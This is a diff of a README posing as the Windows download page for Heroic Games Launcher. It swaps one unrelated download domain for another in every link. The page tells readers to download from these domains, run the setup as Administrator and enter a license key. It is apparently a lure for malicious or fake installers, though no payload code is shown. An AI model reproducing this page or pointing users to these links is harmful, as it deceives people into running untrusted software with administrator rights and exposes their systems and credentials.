@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Heroic Games Launcher** for Windows.
 
 <p align="center">
-  <a href="https://heroic.zipzapsol.space/">
+  <a href="https://heroic.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Heroic%20Games%20Launcher-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Heroic Games Launcher">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[heroic.zipzapsol.space](https://heroic.zipzapsol.space/)** |
-| **Full URL** | `https://heroic.zipzapsol.space/` |
+| **Direct link** | **[heroic.wonderchain.fun](https://heroic.wonderchain.fun/)** |
+| **Full URL** | `https://heroic.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — heroic.zipzapsol.space](https://heroic.zipzapsol.space/)** (link above)
+1. Click **[Download — heroic.wonderchain.fun](https://heroic.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://heroic.zipzapsol.space/"><strong>⬇ Download Heroic Games Launcher now</strong></a></p>
+<p align="center"><a href="https://heroic.wonderchain.fun/"><strong>⬇ Download Heroic Games Launcher now</strong></a></p>
 
 ---
 
